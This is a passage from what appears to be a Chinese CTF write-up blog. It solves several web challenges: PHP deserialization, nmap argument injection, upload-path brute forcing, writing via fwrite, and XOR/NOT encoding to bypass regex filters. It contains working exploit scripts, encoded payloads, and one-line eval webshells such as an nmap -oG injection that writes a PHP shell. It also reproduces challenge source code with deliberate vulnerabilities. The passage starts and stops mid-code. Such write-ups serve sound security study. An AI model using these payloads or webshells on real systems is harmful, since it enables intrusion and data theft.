operator">-</span><span class="token operator">></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第一层bypass："><a href="#第一层bypass：" class="headerlink" title="第一层bypass："></a>第一层bypass：</h3><p>利用php7.1的特性对由protected反序列化产生的特殊字符导致无法绕过ord函数来进行绕过：修改成员的属性为public</p><h3 id="第二层bypass："><a href="#第二层bypass：" class="headerlink" title="第二层bypass："></a>第二层bypass：</h3><p>由于write()函数在逻辑上一点用没有，所以想要实现file_get_contents函数的调用就必须使用read函数，所以利用===与==强弱类型bypass：$op=2;</p><p>最后的参数赋值为flag.php</p><p>exp：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得：</p><pre><code>?str=O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D</code></pre><p>右键源代码查看flag</p><h2 id="2020-网鼎杯-朱雀组-Web-nmap"><a href="#2020-网鼎杯-朱雀组-Web-nmap" class="headerlink" title="2020-网鼎杯-朱雀组-Web-nmap"></a>2020-网鼎杯-朱雀组-Web-nmap</h2><p>与buuctf上的[BUUCTF 2018]Online Tool很像</p><h3 id="hints："><a href="#hints：" class="headerlink" title="hints："></a>hints：</h3><p>flag is in /flag</p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1.<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">escapeshellarg()+escapeshellcmd()</a>两个函数并用导致的多个参数的注入</p><p>2.nmap命令参数：</p><p>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件</p><h3 id="bypass细节："><a href="#bypass细节：" class="headerlink" title="bypass细节："></a>bypass细节：</h3><p>传入127.0’ -oG</p><p>经过escapeshellarg()函数处理（先转义单引号，再用单引号将左右两部分的的参数括起来，被转义的单引号不在范围之内）：</p><p>1.<code>127.0\&#39; -oG</code></p><p>2.<code>&#39;127.0&#39;\&#39; &#39;-oG&#39;</code></p><p>然后经过<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">escapeshellcmd()函数</a>处理（在linux系统中&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A和 \xFF将会被转义。 ‘ 和 “仅在不配对儿的时候被转义。）：</p><p><code>&#39;127.0&#39;\\&#39;&#39;-oG\&#39;</code>这样的话\先被转义了，然后其后面的单引号就与下一个单引号合并变成了’’也就可以理解为一个括了一个空值，也就等于啥也没有，就可以被忽略了，这样最后的单引号没有配对的所以也会被转义最后变成：’127.0’\ -oG’也就是127.0\ -oG’</p><p>也就是由一开始的形态127.0’ -oG变成了127.0\ -oG’也就是说单引号会被去掉变成\</p><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>利用nmap参数-iL来读取/flag然后利用-oN将扫描结果打印到一个可读文件中，然后访问即可</p><pre><code>&#39; -iL /flag -oN flag.txt &#39;</code></pre><p>访问flag.txt即可</p><h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>利用nmap的-oG参数将命令和结果写入一个一句话木马：</p><p>由于php被过滤所以需要用&lt;?=来bypass</p><pre><code>&#39; &lt;?= @eval($_POST[a]);?&gt; -oG shell.phtml &#39;</code></pre><p>然后火狐传入post参数：</p><p>a=system(‘cat /flag’);</p><h2 id="2017-赛客夏令营-Web-Uploadddd"><a href="#2017-赛客夏令营-Web-Uploadddd" class="headerlink" title="2017-赛客夏令营-Web-Uploadddd"></a>2017-赛客夏令营-Web-Uploadddd</h2><p>首先利用后台泄露小字典fuzz一波，得到<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51030_1.png" alt></p><p>打开虚拟机vim -r index.php.swp恢复一下得到源代码：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51050_2.png" alt></p><p>代码审计：</p><p>时间戳+0-999任意数字+.php构成上传的文件名</p><p>bypass：</p><p>抓包得到时间戳：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51057_3.png" alt></p><p>20210509025638+0-999+.php</p><p>利用攻击版块爆破0-999得到路径：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51130_4.png" alt></p><p>uploads/20210509032726948.php</p><p>蚁剑整上：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8809%E6%97%A51132_5.png" alt></p><h2 id="2021-第四届红帽杯网络安全大赛-Web-find-it"><a href="#2021-第四届红帽杯网络安全大赛-Web-find-it" class="headerlink" title="2021-第四届红帽杯网络安全大赛-Web-find_it"></a>2021-第四届红帽杯网络安全大赛-Web-find_it</h2><p>备份泄露字典扫完以后发现了robots.txt响应为200，得到提示：1ndexx.php</p><p>无法直接访问，继续尝试/.1ndexx.php.swp，得到源码：</p><pre class="line-numbers language-php+html"><code class="language-php+html"><?php#Really easy...$file=fopen("flag.php","r") or die("Unable 2 open!");$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize("flag.php"));$hack=fopen("hack.php","w") or die("Unable 2 open");$a=$_GET['code'];if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){    die("you die");}if(strlen($a)>33){    die("nonono.");}fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-filesystem-fread.html" target="_blank" rel="noopener">fread函数</a></p><p>代码审计到<a href="https://www.runoob.com/php/func-filesystem-fwrite.html" target="_blank" rel="noopener">fwrite函数</a>，而且是将get传出的参数写进去，可以考虑一句话木马，同时传入的参数不能大于33个字符，同时还会将flag.php中的内容读写到hack.php，解法一：没有过滤Eval，</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">Eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后蚁剑连接即可：xxx.xxx.xxx.xxx/hack.php</p><p>解法二：</p><p>写入</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2016-西普杯京津冀信息安全挑战赛-Web-web01"><a href="#2016-西普杯京津冀信息安全挑战赛-Web-web01" class="headerlink" title="2016-西普杯京津冀信息安全挑战赛-Web-web01"></a>2016-西普杯京津冀信息安全挑战赛-Web-web01</h2><p>robots.txt文件泄露，需要先将re2给搞出来</p><p>得到用户名：admin密码：328du919sud9</p><p>登陆后显示Flag is Not Here! </p><p>抓包对is_login进行修改，将0变成1</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8819%E6%97%A50906_1.png" alt></p><h2 id="2016-西普杯京津冀信息安全挑战赛-Web-web02"><a href="#2016-西普杯京津冀信息安全挑战赛-Web-web02" class="headerlink" title="2016-西普杯京津冀信息安全挑战赛-Web-web02"></a>2016-西普杯京津冀信息安全挑战赛-Web-web02</h2><p>字典结合burp进行半自动化扫描一把，发现robots.txt得到部分信息：</p><p>Powered By Copyright 2012 - 2016 Vwins All Right Reserved.</p><p>得知是Vwins cms的环境，在该环境下存在一个GET方式添加”allowed=*”绕过上传限制的漏洞。</p><p>另外还有一点后端的限制，需要修改一下文件的上传类型</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8817%E6%97%A51959_1.png" alt></p><h2 id="2020-第五空间智能安全大赛-web-hate-php"><a href="#2020-第五空间智能安全大赛-web-hate-php" class="headerlink" title="2020-第五空间智能安全大赛-web-hate-php"></a>2020-第五空间智能安全大赛-web-hate-php</h2><h3 id="知识拓展："><a href="#知识拓展：" class="headerlink" title="知识拓展："></a>知识拓展：</h3><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">无字母数字webshell之提高篇</a></p><p>其中包括了命令执行的新方式</p><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You are too good for me'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'internal'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/im'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You deserve better'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$blacklist的值是所有的内置函数</p><h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>1.利用异或来绕过：在php中两个字符串进行异或操作以后，得到的还是一个字符串</p><p>可以利用如下php脚本来实现：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$l</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$l</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$l</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$flag</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$l</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">'^'</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">'='</span> <span class="token punctuation">.</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$l</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">'^'</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：</p><pre><code>%80^%F0=p%80^%E8=h%80^%F0=p%80^%E9=i%80^%EE=n%80^%E6=f%80^%EF=o%80^%A8=(%80^%A9=)%80%80%80%80%80%80%80%80%80^%F0%E8%F0%E9%EE%E6%EF%A8%A9</code></pre><p>然后结合php7的新的执行动态函数的方法也就是(‘phpinfo’)()来实现命令执行</p><p>也就是可以继续利用(system)(ls)来继续查看当前的目录中的内容</p><p>然后利用(show_source)(flag.php)</p><p>(%80%80%80%80%80%80%80%80%80%80%80^%F3%E8%EF%F7%DF%F3%EF%F5%F2%E3%E5)(%80%80%80%80%80%80%80%80^%E6%EC%E1%E7%AE%F0%E8%F0)</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>此方法只适用于php7</p><pre><code>&lt;?phpecho urlencode(~&#39;highlight_file&#39;);  //%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9Aecho &quot;\n&quot;;echo urlencode(~&#39;flag.php&#39;); //%99%93%9E%98%D1%8F%97%8F?&gt;</code></pre><p>利用取反来实现命令执行，绕过正则匹配的方法与上面相同，使用亮高打印flag：(highlight_file)(flag.php)</p><p>(<del>%97%96%98%97%93%96%98%97%8B%A0%99%96%93%9A)(</del>%99%93%9E%98%D1%8F%97%8F)</p><h2 id="2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php"><a href="#2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate-php" class="headerlink" title="2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate_php"></a>2021-第五届世界智能大会-「津门杯」国际网络安全创新大赛-Web-hate_php</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token 